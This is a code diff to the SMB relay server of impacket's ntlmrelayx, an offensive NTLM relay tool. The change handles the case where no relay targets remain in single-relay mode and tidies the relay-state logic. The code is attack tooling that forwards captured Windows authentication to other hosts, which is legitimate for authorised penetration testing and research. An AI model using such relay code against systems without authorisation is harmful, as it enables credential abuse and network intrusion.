@@ -35,13 +35,14 @@ import ntpath
 from binascii import hexlify, unhexlify
 from six import b
 from impacket import smb, ntlm, LOG, smb3
-from impacket.nt_errors import STATUS_MORE_PROCESSING_REQUIRED, STATUS_ACCESS_DENIED, STATUS_SUCCESS, STATUS_NETWORK_SESSION_EXPIRED
+from impacket.nt_errors import STATUS_MORE_PROCESSING_REQUIRED, STATUS_ACCESS_DENIED, STATUS_SUCCESS, STATUS_NETWORK_SESSION_EXPIRED, STATUS_BAD_NETWORK_NAME
 from impacket.spnego import SPNEGO_NegTokenResp, SPNEGO_NegTokenInit, TypesMech
 from impacket.smbserver import SMBSERVER, outputToJohnFormat, writeJohnOutputToFile
 from impacket.spnego import ASN1_AID, MechTypes, ASN1_SUPPORTED_MECH
 from impacket.examples.ntlmrelayx.servers.socksserver import activeConnections
 from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
 from impacket.smbserver import getFileTime, decodeSMBString, encodeSMBString
+from impacket.smb3structs import SMB2Error
 
 class SMBRelayServer(Thread):
     def __init__(self,config):
@@ -128,14 +129,17 @@ class SMBRelayServer(Thread):
         respPacket['SessionID'] = 0
 
         if self.config.disableMulti:
-            
             if self.config.mode.upper() == 'REFLECTION':
                 self.targetprocessor = TargetsProcessor(singleTarget='SMB://%s:445/' % connData['ClientIP'])
-            self.target = self.targetprocessor.getTarget()
+
+            self.target = self.targetprocessor.getTarget(multiRelay=False)
+            if self.target is None:
+                LOG.info('SMBD-%s: Connection from %s controlled, but there are no more targets left!' %
+                         (connId, connData['ClientIP']))
+                return [SMB2Error()], None, STATUS_BAD_NETWORK_NAME
 
             LOG.info("SMBD-%s: Received connection from %s, attacking target %s://%s" % (connId, connData['ClientIP'], self.target.scheme,
                                                                                       self.target.netloc))
-
             try:
                 if self.config.mode.upper() == 'REFLECTION':
                     # Force standard security when doing reflection
@@ -477,7 +481,11 @@ class SMBRelayServer(Thread):
             if self.config.mode.upper() == 'REFLECTION':
                 self.targetprocessor = TargetsProcessor(singleTarget='SMB://%s:445/' % connData['ClientIP'])
 
-            self.target = self.targetprocessor.getTarget()
+            self.target = self.targetprocessor.getTarget(multiRelay=False)
+            if self.target is None:
+                LOG.info('SMBD-%s: Connection from %s controlled, but there are no more targets left!' %
+                         (connId, connData['ClientIP']))
+                return [smb.SMBCommand(smb.SMB.SMB_COM_NEGOTIATE)], None, STATUS_BAD_NETWORK_NAME
 
             LOG.info("SMBD-%s: Received connection from %s, attacking target %s://%s" % (connId, connData['ClientIP'],
                                                                                          self.target.scheme, self.target.netloc))
@@ -522,10 +530,9 @@ class SMBRelayServer(Thread):
         #############################################################
         # SMBRelay
         # Are we ready to relay or should we just do local auth?
-        if not self.config.disableMulti:
-            if 'relayToHost' not in connData:
-                # Just call the original SessionSetup
-                return self.origSmbSessionSetupAndX(connId, smbServer, SMBCommand, recvPacket)
+        if not self.config.disableMulti and 'relayToHost' not in connData:
+            # Just call the original SessionSetup
+            return self.origSmbSessionSetupAndX(connId, smbServer, SMBCommand, recvPacket)
         # We have confirmed we want to relay to the target host.
         respSMBCommand = smb.SMBCommand(smb.SMB.SMB_COM_SESSION_SETUP_ANDX)
 
@@ -721,7 +728,8 @@ class SMBRelayServer(Thread):
 
                 # Done with the relay for now.
                 connData['Authenticated'] = True
-                del(connData['relayToHost'])
+                if not self.config.disableMulti:
+                    del(connData['relayToHost'])
                 self.do_attack(client)
                 # Now continue with the server
             #############################################################
